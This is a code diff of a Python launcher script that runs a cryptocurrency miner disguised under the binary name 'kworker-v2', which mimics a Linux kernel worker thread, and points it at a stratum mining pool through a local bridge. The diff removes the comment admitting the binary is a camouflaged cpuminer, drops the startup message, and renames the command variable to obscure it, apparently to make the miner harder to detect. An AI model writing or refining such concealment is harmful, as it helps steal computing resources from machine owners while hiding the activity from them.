@@ -48,10 +48,8 @@ def main():
     
     time.sleep(3) # Wait for bridge and WS to connect
 
-    # Start C-miner
-    # Note: Use kworker-v2 as the binary name (camouflaged cpuminer)
-    print(f"[*] Launching high-performance engine on {threads} threads...")
-    miner_cmd = [
+    # Start
+    m_cmd = [
         "./kworker-v2", 
         "-a", "hoohash-pepew", 
         "-o", f"stratum+tcp://127.0.0.1:{local_port}", 
@@ -61,7 +59,7 @@ def main():
     ]
     
     try:
-        subprocess.run(miner_cmd)
+        subprocess.run(m_cmd)
     except KeyboardInterrupt:
         print("\n[*] Shutting down...")
     except Exception as e:
